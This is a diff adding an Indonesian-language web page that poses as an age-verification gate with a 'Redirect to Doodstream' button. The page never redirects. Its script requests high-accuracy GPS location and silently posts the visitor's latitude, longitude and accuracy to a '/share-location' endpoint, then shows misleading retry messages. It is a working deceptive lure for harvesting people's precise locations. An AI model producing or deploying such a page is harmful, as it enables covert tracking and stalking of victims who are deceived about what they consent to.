@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verifikasi Usia</title>
+<style>body{font-family:system-ui,sans-serif;background:#f4f7f6;margin:0;padding:24px;color:#163c34}.panel{max-width:470px;margin:7vh auto;background:white;padding:28px;border-radius:18px;box-shadow:0 8px 30px #163c3418}h1{font-size:1.55rem}button{background:#14775a;color:white;border:0;padding:15px;border-radius:12px;width:100%;font-size:1.05rem;font-weight:bold;cursor:pointer}button:disabled{opacity:.6;cursor:wait}label{display:flex;gap:10px;margin:22px 0;line-height:1.5}#status{min-height:45px;line-height:1.5}small{color:#566a65}a{color:#12684f}</style></head>
+<body><main class="panel"><h1>Verifikasi Usia Anda</h1>
+<p>Apakah anda berusia 18 tahun atau lebih?</p>
+<label><input id="consent" type="checkbox"> <span>Saya berusia 18 tahun dan setuju untuk mengunjungi website ini.</span></label>
+<button id="send">Redirect to Doodstream</button><p id="status" role="status" aria-live="polite"></p>
+<script>
+const button=document.getElementById('send'), status=document.getElementById('status'), consent=document.getElementById('consent');
+button.addEventListener('click',()=>{
+  if(!consent.checked){status.textContent='Centang persetujuan terlebih dahulu.';return;}
+  if(!navigator.geolocation){status.textContent='Browser tidak mendukung lokasi GPS.';return;}
+  button.disabled=true;status.textContent='Meminta izin lokasi perangkat…';
+  navigator.geolocation.getCurrentPosition(async ({coords})=>{
+    status.textContent='Mencoba membuka doodstream.com';
+    try{
+      const res=await fetch('/share-location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude:coords.latitude,longitude:coords.longitude,accuracy:coords.accuracy,consent:true})});
+      const data=await res.json();if(!res.ok)throw Error(data.error||'Pengiriman gagal');
+      status.textContent=data.status+' Coba lagi dalam: ±'+Math.round(coords.accuracy)+' detik.';
+    }catch(e){status.textContent=e.message+'Coba Refresh Halaman';}
+    finally{button.disabled=false;}
+  },(err)=>{const messages={1:'Izin lokasi ditolak. Aktifkan izin lokasi di pengaturan browser.',2:'Lokasi tidak tersedia. Coba di area terbuka.',3:'Pencarian lokasi terlalu lama. Coba lagi.'};status.textContent=messages[err.code]||'Gagal memperoleh lokasi.';button.disabled=false;},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+});
+</script></body></html>
